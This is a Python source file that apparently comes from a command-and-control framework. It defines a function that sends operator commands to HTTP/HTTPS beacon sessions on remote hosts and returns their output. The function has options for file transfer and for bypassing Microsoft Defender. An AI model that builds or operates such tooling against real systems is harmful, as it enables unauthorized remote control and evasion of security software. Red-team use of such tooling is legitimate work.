import os
import sys
import queue
import base64
import logging

from core import utils
from core.utils import defender
from core.command_routing.http_command_router import CommandRouter
from core.session_handlers import session_manager, sessions

from colorama import init, Fore, Style
brightgreen = "\001" + Style.BRIGHT + Fore.GREEN + "\002"
brightyellow = "\001" + Style.BRIGHT + Fore.YELLOW + "\002"
brightred = "\001" + Style.BRIGHT + Fore.RED + "\002"
brightblue = "\001" + Style.BRIGHT + Fore.BLUE + "\002"
reset = Style.RESET_ALL

logger = logging.getLogger(__name__)


def run_command_http(sid, cmd, output=True, defender_bypass=False, op_id=None, transfer_use: bool=False, timeout: float = None):
	"""
	Execute `cmd` on HTTP/HTTPS beacon session `sid` for operator `op_id`.
	Returns decoded output or None.
	"""
	session = session_manager.sessions[sid]
	router  = CommandRouter(session)

	# default to console operator
	if not op_id:
		op_id = "console"

	# clear any stale responses
	router.flush_response(op_id)

	# send the command (may raise PermissionError)
	try:
		router.send(cmd, op_id=op_id, defender_bypass=defender_bypass, transfer_use=transfer_use)
	except PermissionError as e:
		print(f"[!] {e}")
		return None

	except Exception as e:
		logger.warning(brightred + f"Hit exception while sending command over HTTP/HTTPS transport: {e}" + reset)
		if transfer_use:
			raise ConnectionError("Hit exception while sending command over HTTP/HTTPS transport") from e

		else:
			return None

	if not output:
		return None

	if transfer_use:
		timeout = timeout

	else:
		timeout = None

	# block until response or timeout=None
	try:
		return router.receive(op_id=op_id, block=True, timeout=timeout, transfer_use=transfer_use)

	except queue.Empty:
		logging.debug("No response available for sid=%r, op_id=%r", sid, op_id)
		if transfer_use:
			raise ConnectionError("Hit empty queue during transfer, indicates a connection error")

		else:	
			return None

	except Exception as e:
		logger.warning(brightred + f"Hit exception while receiving output over HTTP/HTTPS transport: {e}" + reset)
		if transfer_use:
			raise ConnectionError("Hit exception while receiving output over HTTP/HTTPS transport") from e

		else:
			return None